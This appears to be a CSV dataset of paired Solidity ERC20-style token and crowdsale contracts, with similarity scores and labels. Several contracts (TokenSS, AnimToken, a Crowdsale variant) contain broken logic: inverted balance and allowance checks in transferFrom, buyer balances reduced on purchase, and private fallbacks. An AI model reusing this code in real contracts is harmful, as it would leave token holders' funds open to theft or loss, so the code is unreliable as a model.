        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    
    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

}",0,,,,,
"contract SujiToken { string public name = 'Suji';    string public symbol = 'SUJI';  string public standard = 'Suji Token v1.0'; uint256 public totalSupply; event Transfer(     address indexed _from,      address indexed _to,        uint256 _value      );  event Approval(     address indexed _owner,     address indexed _spender,       uint256 _value      );  mapping(address => mapping(address => uint256)) public allowance;   mapping(address => uint256) public balanceOf;   constructor(uint256 _amount) public{ require(_amount >0,'amount should be greater than zero');      totalSupply = _amount;      balanceOf[msg.sender] = totalSupply;    }   function transfer(address _to, uint256 _value) public payable returns (bool success){       require(balanceOf[msg.sender] >= _value);       balanceOf[msg.sender] -= _value;        balanceOf[_to] += _value;       emit Transfer(msg.sender,_to,_value);       return true;    }   function approve(address _spender, uint256 _value) public returns (bool success){       allowance[msg.sender][_spender] = _value;       emit Approval(msg.sender,_spender,_value);      return true;    }   function transferFrom(address _from, address _to, uint _value) public returns (bool success) {      require(_value <= balanceOf[_from]);        require(_value <= allowance[_from][msg.sender]);        balanceOf[_from] -= _value;     balanceOf[_to] += _value;       allowance[_from][msg.sender] -= _value;     emit Transfer(_from, _to, _value);      return true;    }}",0.906871228,"contract	BANK_I_PFI_883				{				

										

		mapping (address => uint256) public balanceOf;								

										

		string	public		name =	""	BANK_I_PFI_883		""	;

		string	public		symbol =	""	BANK_I_PFI_IMTD		""	;

		uint8	public		decimals =		18			;

										

		uint256 public totalSupply =		416988875961585000000000000					;	

										

		event Transfer(address indexed from, address indexed to, uint256 value);								

										

		function SimpleERC20Token() public {								

			balanceOf[msg.sender] = totalSupply;							

			emit Transfer(address(0), msg.sender, totalSupply);							

		}								

										

		function transfer(address to, uint256 value) public returns (bool success) {								

			require(balanceOf[msg.sender] >= value);							

										

			balanceOf[msg.sender] -= value;  

			balanceOf[to] += value;          

			emit Transfer(msg.sender, to, value);							

			return true;							

		}								

										

		event Approval(address indexed owner, address indexed spender, uint256 value);								

										

		mapping(address => mapping(address => uint256)) public allowance;								

										

		function approve(address spender, uint256 value)								

			public							

			returns (bool success)							

		{								

			allowance[msg.sender][spender] = value;							

			emit Approval(msg.sender, spender, value);							

			return true;							

		}								

										

		function transferFrom(address from, address to, uint256 value)								

			public							

			returns (bool success)							

		{								

			require(value <= balanceOf[from]);							

			require(value <= allowance[from][msg.sender]);							

										

			balanceOf[from] -= value;							

			balanceOf[to] += value;							

			allowance[from][msg.sender] -= value;							

			emit Transfer(from, to, value);							

			return true;							

		}								



										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

										

	}",2,,,,,
"contract JONJonnywon {
    
    string public constant name = ""JONNYWON"";

    
    string public constant symbol = ""JON"";

    uint8 public constant decimals = 2;

    
    address public owner;

    address public treasury;

    uint256 public totalSupply;

    mapping (address => mapping (address => uint256)) private allowed;
    mapping (address => uint256) private balances;

    event Approval(address indexed tokenholder, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() public {
        owner = msg.sender;

        
        treasury = address(<0xBB9bc244D798123fDe783fCc1C72d3Bb8C189413>);

        
        totalSupply = 1000000000 * 10**uint(decimals);

        balances[treasury] = totalSupply;
        emit Transfer(address(0), treasury, totalSupply);
    }

    function () external payable {
        revert();
    }

    function allowance(address _tokenholder, address _spender) public view returns (uint256 remaining) {
        return allowed[_tokenholder][_spender];
    }

    function approve(address _spender, uint256 _value) public returns (bool) {
        require(_spender != address(0));
        require(_spender != msg.sender);

        allowed[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;
    }

    function balanceOf(address _tokenholder) public view returns (uint256 balance) {
        return balances[_tokenholder];
    }

    function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool success) {
        require(_spender != address(0));
        require(_spender != msg.sender);

        if (allowed[msg.sender][_spender] <= _subtractedValue) {
            allowed[msg.sender][_spender] = 0;
        } else {
            allowed[msg.sender][_spender] = allowed[msg.sender][_spender] - _subtractedValue;
        }

        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);

        return true;
    }

    function increaseApproval(address _spender, uint _addedValue) public returns (bool success) {
        require(_spender != address(0));
        require(_spender != msg.sender);
        require(allowed[msg.sender][_spender] <= allowed[msg.sender][_spender] + _addedValue);

        allowed[msg.sender][_spender] = allowed[msg.sender][_spender] + _addedValue;

        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);

        return true;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(_to != msg.sender);
        require(_to != address(0));
        require(_to != address(this));
        require(balances[msg.sender] - _value <= balances[msg.sender]);
        require(balances[_to] <= balances[_to] + _value);
        require(_value <= transferableTokens(msg.sender));

        balances[msg.sender] = balances[msg.sender] - _value;
        balances[_to] = balances[_to] + _value;

        emit Transfer(msg.sender, _to, _value);

        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require(_from != address(0));
        require(_from != address(this));
        require(_to != _from);
        require(_to != address(0));
        require(_to != address(this));
        require(_value <= transferableTokens(_from));
        require(allowed[_from][msg.sender] - _value <= allowed[_from][msg.sender]);
        require(balances[_from] - _value <= balances[_from]);
        require(balances[_to] <= balances[_to] + _value);

        allowed[_from][msg.sender] = allowed[_from][msg.sender] - _value;
        balances[_from] = balances[_from] - _value;
        balances[_to] = balances[_to] + _value;

        emit Transfer(_from, _to, _value);

        return true;
    }

    function transferOwnership(address _newOwner) public {
        require(msg.sender == owner);
        require(_newOwner != address(0));
        require(_newOwner != address(this));
        require(_newOwner != owner);

        address previousOwner = owner;
        owner = _newOwner;

        emit OwnershipTransferred(previousOwner, _newOwner);
    }

    function transferableTokens(address holder) public view returns (uint256) {
        return balanceOf(holder);
    }
}",0.982358197,"contract UppMeetCoin {
    
    string public constant name = ""UppMeetCoin"";

    
    string public constant symbol = ""UMCoin"";

    uint8 public constant decimals = 18;
    
    
    address public owner;

    address public treasury;

    uint256 public totalSupply;

    mapping (address => mapping (address => uint256)) private allowed;
    mapping (address => uint256) private balances;

    event Approval(address indexed tokenholder, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() public {
        owner = msg.sender;

        
        treasury = address(0xdE03fb39876A86d156dC60f73D35b6Dd557635D6);

        
        totalSupply = 1000000000 * 10**uint(decimals);

        balances[treasury] = totalSupply;
        emit Transfer(address(0), treasury, totalSupply);
    }

    function () external payable {
        revert();
    }

    function allowance(address _tokenholder, address _spender) public view returns (uint256 remaining) {
        return allowed[_tokenholder][_spender];
    }

    function approve(address _spender, uint256 _value) public returns (bool) {
        require(_spender != address(0));
        require(_spender != msg.sender);

        allowed[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;
    }

    function balanceOf(address _tokenholder) public view returns (uint256 balance) {
        return balances[_tokenholder];
    }

    function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool success) {
        require(_spender != address(0));
        require(_spender != msg.sender);

        if (allowed[msg.sender][_spender] <= _subtractedValue) {
            allowed[msg.sender][_spender] = 0;
        } else {
            allowed[msg.sender][_spender] = allowed[msg.sender][_spender] - _subtractedValue;
        }

        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);

        return true;
    }

    function increaseApproval(address _spender, uint _addedValue) public returns (bool success) {
        require(_spender != address(0));
        require(_spender != msg.sender);
        require(allowed[msg.sender][_spender] <= allowed[msg.sender][_spender] + _addedValue);

        allowed[msg.sender][_spender] = allowed[msg.sender][_spender] + _addedValue;

        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);

        return true;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(_to != msg.sender);
        require(_to != address(0));
        require(_to != address(this));
        require(balances[msg.sender] - _value <= balances[msg.sender]);
        require(balances[_to] <= balances[_to] + _value);
        require(_value <= transferableTokens(msg.sender));

        balances[msg.sender] = balances[msg.sender] - _value;
        balances[_to] = balances[_to] + _value;

        emit Transfer(msg.sender, _to, _value);

        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require(_from != address(0));
        require(_from != address(this));
        require(_to != _from);
        require(_to != address(0));
        require(_to != address(this));
        require(_value <= transferableTokens(_from));
        require(allowed[_from][msg.sender] - _value <= allowed[_from][msg.sender]);
        require(balances[_from] - _value <= balances[_from]);
        require(balances[_to] <= balances[_to] + _value);

        allowed[_from][msg.sender] = allowed[_from][msg.sender] - _value;
        balances[_from] = balances[_from] - _value;
        balances[_to] = balances[_to] + _value;

        emit Transfer(_from, _to, _value);

        return true;
    }

    function transferOwnership(address _newOwner) public {
        require(msg.sender == owner);
        require(_newOwner != address(0));
        require(_newOwner != address(this));
        require(_newOwner != owner);

        address previousOwner = owner;
        owner = _newOwner;

        emit OwnershipTransferred(previousOwner, _newOwner);
    }

    function transferableTokens(address holder) public view returns (uint256) {
        return balanceOf(holder);
    }
}",1,,,,,
"contract ContractSS {
function balanceOf(address _owner) constant returns (uint256);
function transfer(address _to, uint256 _value) returns (bool);
}",0.928027822,"contract ForeignToken {
    function balanceOf(address _owner) constant returns (uint256);
    function transfer(address _to, uint256 _value) returns (bool);
}",1,,,,,
"contract TokenSS {
address owner = msg.sender;
bool public purchasingAllowed = true;
mapping (address => uint256) balances;
mapping (address => mapping (address => uint256)) allowed;
uint256 public totalContribution = 0;
uint256 public totalBonusTokensIssued = 0;
uint256 public totalSupply = 1000000;
uint256 public TokenPrice = 0.0001 ether;

function name() constant returns (string) { return ""TokenSS""; }
function symbol() constant returns (string) { return ""SS""; }
function decimals() constant returns (uint8) { return 0; }

function TokenSS () {
    balances[msg.sender] = totalSupply;
}

function balanceOf(address _owner) constant returns (uint256) { return       balances[_owner]; }       

function transfer(address _to, uint256 _value) returns (bool success) {

    if(msg.data.length < (2 * 32) + 4) { return; }

    if (_value == 0) { return false; }

    uint256 fromBalance = balances[msg.sender];

    bool sufficientFunds = fromBalance >= _value;
    bool overflowed = balances[_to] + _value < balances[_to];

    if (sufficientFunds && !overflowed) {
        balances[msg.sender] -= _value;
        balances[_to] += _value;

        Transfer(msg.sender, _to, _value);
        return true;
    } else { return false; }
}

function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {

    if(msg.data.length < (3 * 32) + 4) { return; }

    if (_value == 0) { return false; }

    uint256 fromBalance = balances[_from];
    uint256 allowance = allowed[_from][msg.sender];

    bool sufficientFunds = fromBalance <= _value;
    bool sufficientAllowance = allowance <= _value;
    bool overflowed = balances[_to] + _value > balances[_to];

    if (sufficientFunds && sufficientAllowance && !overflowed) {
        balances[_to] += _value;
        balances[_from] -= _value;

        allowed[_from][msg.sender] -= _value;

        Transfer(_from, _to, _value);
        return true;
    } else { return false; }
}

function approve(address _spender, uint256 _value) returns (bool success) {

    if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }

    allowed[msg.sender][_spender] = _value;

    Approval(msg.sender, _spender, _value);
    return true;
}

function allowance(address _owner, address _spender) constant returns (uint256) {
    return allowed[_owner][_spender];
}

event Transfer(address indexed _from, address indexed _to, uint256 _value);
event Approval(address indexed _owner, address indexed _spender, uint256 _value);

function enablePurchasing() {
    if (msg.sender != owner) { return; }

    purchasingAllowed = true;
}

function disablePurchasing() {
    if (msg.sender != owner) { return; }

    purchasingAllowed = false;
}

function withdrawForeignTokens(address _tokenContract) returns (bool) {
    if (msg.sender != owner) { return; }

    ContractSS token = ContractSS(_tokenContract);

    uint256 amount = token.balanceOf(address(this));
    return token.transfer(owner, amount / TokenPrice);
}

function getStats() constant returns (uint256, uint256, uint256, bool) {
    return (totalContribution, totalSupply, totalBonusTokensIssued, purchasingAllowed);
}

function() payable {
    if (!purchasingAllowed) { return; }

    if (msg.value == 0) { return; }

    owner.transfer(msg.value);
    totalContribution += msg.value;

    uint256 tokensIssued = (msg.value / TokenPrice);
    totalSupply -= tokensIssued;
    balances[msg.sender] -= tokensIssued;

    Transfer(address(this), msg.sender, tokensIssued);
}
}",0.949607316,"contract AnimToken {
    address owner = msg.sender;

    bool public purchasingAllowed = false;

    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;

    uint256 public totalContribution = 0;
    uint256 public totalBonusTokensIssued = 0;

    uint256 public totalSupply = 25000000000000000000000000;
    uint256 public maxTotalSupply = 60000000000000000000000000;

    function name() constant returns (string) { return ""Animatix Token""; }
    function symbol() constant returns (string) { return ""ANIM""; }
    function decimals() constant returns (uint8) { return 18; }
    
    function balanceOf(address _owner) constant returns (uint256) { return balances[_owner]; }
    
    function transfer(address _to, uint256 _value) returns (bool success) {
        
        if(msg.data.length < (2 * 32) + 4) { throw; }

        if (_value == 0) { return false; }

        uint256 fromBalance = balances[msg.sender];

        bool sufficientFunds = fromBalance >= _value;
        bool overflowed = balances[_to] + _value < balances[_to];
        
        if (sufficientFunds && !overflowed) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            
            Transfer(msg.sender, _to, _value);
            return true;
        } else { return false; }
    }
    
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        
        if(msg.data.length < (3 * 32) + 4) { throw; }

        if (_value == 0) { return false; }
        
        uint256 fromBalance = balances[_from];
        uint256 allowance = allowed[_from][msg.sender];

        bool sufficientFunds = fromBalance <= _value;
        bool sufficientAllowance = allowance <= _value;
        bool overflowed = balances[_to] + _value > balances[_to];

        if (sufficientFunds && sufficientAllowance && !overflowed) {
            balances[_to] += _value;
            balances[_from] -= _value;
            
            allowed[_from][msg.sender] -= _value;
            
            Transfer(_from, _to, _value);
            return true;
        } else { return false; }
    }
    
    function approve(address _spender, uint256 _value) returns (bool success) {
        
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        
        allowed[msg.sender][_spender] = _value;
        
        Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function allowance(address _owner, address _spender) constant returns (uint256) {
        return allowed[_owner][_spender];
    }

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    function icoStart() {
        if (msg.sender != owner) { throw; }

        purchasingAllowed = true;
    }

    function icoStop() {
        if (msg.sender != owner) { throw; }

        purchasingAllowed = false;
    }

    function withdrawBasicTokens(address _tokenContract) returns (bool) {
        if (msg.sender != owner) { throw; }

        BasicToken token = BasicToken(_tokenContract);

        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
    

    function getStats() constant returns (uint256, uint256, uint256, bool) {
        return (totalContribution, totalSupply, totalBonusTokensIssued, purchasingAllowed);
    }

    function() payable {
        if (!purchasingAllowed) { throw; }
        
        if (msg.value == 0) { return; }
        
        if (msg.value >= 100 finney) {

        owner.transfer(msg.value);
        totalContribution += msg.value;

        uint256 tokensIssued = (msg.value * 20000);

        
        totalSupply += tokensIssued;
        balances[msg.sender] += tokensIssued;
        
        Transfer(address(this), msg.sender, tokensIssued);
        
       } else { throw; }
    
}
}",1,,,,,
"contract Token {

  event Transfer(address indexed from, address indexed to, uint value);
  event Approval( address indexed owner, address indexed spender, uint value);

  mapping( address => uint ) _balances;
  mapping( address => mapping( address => uint ) ) _approvals;
  uint public _supply;
  function Token( uint initial_balance ) {
    _balances[msg.sender] = initial_balance;
    _supply = initial_balance;
  }
  function totalSupply() constant returns (uint supply) {
    return _supply;
  }
  function balanceOf( address who ) constant returns (uint value) {
    return _balances[who];
  }
  function transfer( address to, uint value) returns (bool ok) {
    if( _balances[msg.sender] < value ) {
      throw;
    }
    if( !safeToAdd(_balances[to], value) ) {
      throw;
    }
    _balances[msg.sender] -= value;
    _balances[to] += value;
    Transfer( msg.sender, to, value );
    return true;
  }
  function transferFrom( address from, address to, uint value) returns (bool ok) {
    
    if( _balances[from] < value ) {
      throw;
    }
    
    if( _approvals[from][msg.sender] < value ) {
      throw;
    }
    if( !safeToAdd(_balances[to], value) ) {
      throw;
    }
    
    _approvals[from][msg.sender] -= value;
    _balances[from] -= value;
    _balances[to] += value;
    Transfer( from, to, value );
    return true;
  }
  function approve(address spender, uint value) returns (bool ok) {
    
    _approvals[msg.sender][spender] = value;
    Approval( msg.sender, spender, value );
    return true;
  }
  function allowance(address owner, address spender) constant returns (uint _allowance) {
    return _approvals[owner][spender];
  }
  function safeToAdd(uint a, uint b) internal returns (bool) {
    return (a + b >= a);
  }
}",0.900644818,"contract BOBOToken {

  event Transfer(address indexed _from, address indexed _to, uint256 _value);
  event Approval(address indexed _owner, address indexed _spender, uint256 _value);


  mapping( address => uint ) _balances;
  mapping( address => mapping( address => uint ) ) _approvals;
  uint256 public totalSupply=21000000;
  string public name=""BOBOToken"";
  uint8 public decimals=8;                
  string public symbol=""BOBO"";   

  function BOBOToken() {
        _balances[msg.sender] = totalSupply;               
  }

  function balanceOf( address _owner ) constant returns (uint balanbce) {
    return _balances[_owner];
  }

  function transfer( address _to, uint _value) returns (bool success) {
    if ( _balances[msg.sender] < _value ) {
      revert();
    }
    if ( !safeToAdd(_balances[_to], _value) ) {
      revert();
    }
    _balances[msg.sender] -= _value;
    _balances[_to] += _value;
    Transfer(msg.sender, _to, _value);
    return true;
  }
  function transferFrom( address _from, address _to, uint _value) returns (bool success) {
    
    if ( _balances[_from] < _value ) {
      revert();
    }
    
    if ( _approvals[_from][msg.sender] < _value ) {
      revert();
    }
    if ( !safeToAdd(_balances[_to], _value) ) {
      revert();
    }
    
    _approvals[_from][msg.sender] -= _value;
    _balances[_from] -= _value;
    _balances[_to] += _value;
    Transfer(_from, _to, _value);
    return true;
  }
  function approve(address _spender, uint _value) returns (bool success) {
    
    _approvals[msg.sender][_spender] = _value;
    Approval(msg.sender, _spender, _value);
    return true;
  }
  function allowance(address _owner, address _spender) constant returns (uint remaining) {
    return _approvals[_owner][_spender];
  }
  function safeToAdd(uint a, uint b) internal returns (bool) {
    return (a + b >= a);
  }
}",2,,,,,
"contract ERC20 {
    
    

    function balanceOf(address _owner) constant returns (uint balance);
    function transfer(address _to, uint _value) returns (bool success);
    function transferFrom(address _from, address _to, uint _value) returns (bool success);
    function approve(address _spender, uint _value) returns (bool success);
    function allowance(address _owner, address _spender) constant returns (uint remaining);
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
    uint public totalSupply = 0;
    mapping(address => uint256) balances;
}",0.901987572,"contract ERC20 {
    uint public totalSupply;
    function balanceOf(address who) public constant returns (uint);
    function allowance(address owner, address spender) public constant returns (uint);
    function transfer(address toAddress, uint value) public returns (bool ok);
    function transferFrom(address fromAddress, address toAddress, uint value) public returns (bool ok);
    function approve(address spender, uint value) public returns (bool ok);
    event Transfer(address indexed fromAddress, address indexed toAddress, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}",3,,,,,
"contract DreamToken is MintableToken {

  string public constant name = ""Dream Token"";
  string public constant symbol = ""DMT"";
  uint8 public constant decimals = 18;
}",0.919695776,"contract ALMToken is MintableToken {

    string public constant name = ""Almee Token"";

    string public constant symbol = ""ALM"";

    uint8 public constant decimals = 18;



}",1,,,,,
"contract ERC20Interface {
    function totalSupply() public constant returns (uint);
    function balanceOf(address tokenOwner) public constant returns (uint balance);
    function allowance(address tokenOwner, address spender) public constant returns (uint remaining);
    function transfer(address to, uint tokens) public payable returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public payable returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}",0.90127047,"contract ERC20Interface {
    function totalSupply() public constant returns (uint256 _totalSupply);
    function balanceOf(address _owner) public constant returns (uint256 balance);
    function transfer(address _to, uint256 _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
    function approve(address _spender, uint256 _value) public returns (bool success);
    function allowance(address _owner, address _spender) public constant returns (uint256 remaining);
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}",1,,,,,
"contract owned {
    address public owner;

    function owned() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        if (msg.sender != owner) throw;
        _;
    }

    function transferOwnership(address newOwner) onlyOwner {
        owner = newOwner;
    }
}",0.912439293,"contract Owned {
	
    address public owner;

	
    function Owned() {
        owner = msg.sender;
    }
	
	
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

	
    function transferOwnership(address newOwner) onlyOwner {
        owner = newOwner;
    }
}",2,,,,,
"contract token {
    
    string public standard = 'Token 0.1';
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    function token(
        uint256 initialSupply,
        string tokenName,
        uint8 decimalUnits,
        string tokenSymbol
        ) {
        balanceOf[msg.sender] = initialSupply;              
        totalSupply = initialSupply;                        
        name = tokenName;                                   
        symbol = tokenSymbol;                               
        decimals = decimalUnits;                            
    }

    
    function transfer(address _to, uint256 _value) {
        if (balanceOf[msg.sender] < _value) throw;           
        if (balanceOf[_to] + _value < balanceOf[_to]) throw; 
        balanceOf[msg.sender] -= _value;                     
        balanceOf[_to] += _value;                            
        Transfer(msg.sender, _to, _value);                   
    }

    
    function approve(address _spender, uint256 _value)
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        tokenRecipient spender = tokenRecipient(_spender);
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        returns (bool success) {    
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        if (balanceOf[_from] < _value) throw;                 
        if (balanceOf[_to] + _value < balanceOf[_to]) throw;  
        if (_value > allowance[_from][msg.sender]) throw;   
        balanceOf[_from] -= _value;                          
        balanceOf[_to] += _value;                            
        allowance[_from][msg.sender] -= _value;
        Transfer(_from, _to, _value);
        return true;
    }

    
    function () {
        throw;     
    }
}",0.974505653,"contract token {
    string public standard = 'Token 0.1';
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    event Burn(address indexed from, uint256 value);

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function token(
        uint256 initialSupply,
        string tokenName,
        uint8 decimalUnits,
        string tokenSymbol
        ) {
        balanceOf[msg.sender] = initialSupply;
        totalSupply = initialSupply;
        name = tokenName;
        symbol = tokenSymbol;
        decimals = decimalUnits;
    }

    function transfer(address _to, uint256 _value) {
        if (balanceOf[msg.sender] < _value) throw;
        if (balanceOf[_to] + _value < balanceOf[_to]) throw;
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        Transfer(msg.sender, _to, _value);
    }

    function approve(address _spender, uint256 _value)
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        returns (bool success) {    
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        if (balanceOf[_from] < _value) throw;
        if (balanceOf[_to] + _value < balanceOf[_to]) throw;
        if (_value > allowance[_from][msg.sender]) throw;
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        Transfer(_from, _to, _value);
        return true;
    }

    function () {
        throw;
    }
}",1,,,,,
"contract StandardToken is StandardTokenInterface {

    uint256 constant private MAX_UINT256 = 2**256 - 1;
    mapping (address => uint256) public balances;
    mapping (address => mapping (address => uint256)) public allowed;
    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 

    function StandardToken(
        uint256 _initialAmount,
        string _tokenName,
        uint8 _decimalUnits,
        string _tokenSymbol
    ) public {
        balances[msg.sender] = _initialAmount;               
        totalSupply = _initialAmount;                        
        name = _tokenName;                                   
        decimals = _decimalUnits;                            
        symbol = _tokenSymbol;                               
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balances[msg.sender] >= _value);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        emit Transfer(msg.sender, _to, _value); 
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        uint256 allowance = allowed[_from][msg.sender];
        require(balances[_from] >= _value && allowance >= _value);
        balances[_to] += _value;
        balances[_from] -= _value;
        if (allowance < MAX_UINT256) {
            allowed[_from][msg.sender] -= _value;
        }
        emit Transfer(_from, _to, _value); 
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value); 
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
}",0.976975197,"contract QualitySafetyDeal is EIP20Interface {

    uint256 constant private MAX_UINT256 = 2**256 - 1;
    mapping (address => uint256) public balances;
    mapping (address => mapping (address => uint256)) public allowed;
    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 

    function QualitySafetyDeal(
        uint256 _initialAmount,
        string _tokenName,
        uint8 _decimalUnits,
        string _tokenSymbol
    ) public {
        balances[msg.sender] = _initialAmount;               
        totalSupply = _initialAmount;                        
        name = _tokenName;                                   
        decimals = _decimalUnits;                            
        symbol = _tokenSymbol;                               
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balances[msg.sender] >= _value);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        emit Transfer(msg.sender, _to, _value); 
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        uint256 allowance = allowed[_from][msg.sender];
        require(balances[_from] >= _value && allowance >= _value);
        balances[_to] += _value;
        balances[_from] -= _value;
        if (allowance < MAX_UINT256) {
            allowed[_from][msg.sender] -= _value;
        }
        emit Transfer(_from, _to, _value); 
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value); 
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
}",1,,,,,
"contract Crowdsale {
    address public beneficiary;
    uint public fundingGoal;
    uint public amountRaised;
    uint public deadline;
    uint public price;
    token public tokenReward;
    mapping(address => uint256) public balanceOf;
    bool fundingGoalReached = false;
    bool crowdsaleClosed = false;

    event GoalReached(address recipient, uint totalAmountRaised);
    event FundTransfer(address backer, uint amount, bool isContribution);

    
    function Crowdsale(
        address ifSuccessfulSendTo,
        uint fundingGoalInEthers,
        uint durationInMinutes,
        uint etherCostOfEachToken,
        address addressOfTokenUsedAsReward
    ) public {
        beneficiary = ifSuccessfulSendTo;
        fundingGoal = fundingGoalInEthers * 1 ether;
        deadline = now + durationInMinutes * 1 minutes;
        price = etherCostOfEachToken * 0.0005 ether;
        tokenReward = token(addressOfTokenUsedAsReward);
    }

    
    function () private payable {
        require(!crowdsaleClosed);
        uint amount = msg.value;
        balanceOf[msg.sender] += amount;
        amountRaised += amount;
        tokenReward.transfer(msg.sender, amount / price);
        FundTransfer(msg.sender, amount, true);
    }

    modifier afterDeadline() { if (now >= deadline) _; }

    
    function checkGoalReached() private afterDeadline {
        if (amountRaised >= fundingGoal){
            fundingGoalReached = true;
            GoalReached(beneficiary, amountRaised);
        }
        crowdsaleClosed = true;
    }


    
    function safeWithdrawal() private afterDeadline {
        if (!fundingGoalReached) {
            uint amount = balanceOf[msg.sender];
            balanceOf[msg.sender] = 0;
            if (amount > 0) {
                if (msg.sender.send(amount)) {
                    FundTransfer(msg.sender, amount, false);
                } else {
                    balanceOf[msg.sender] = amount;
                }
            }
        }

        if (fundingGoalReached && beneficiary == msg.sender) {
            if (beneficiary.send(amountRaised)) {
                FundTransfer(beneficiary, amountRaised, false);
            } else {
                
                fundingGoalReached = false;
            }
        }
    }
}",0.978217847,"contract Crowdsale {

    address public beneficiary; 

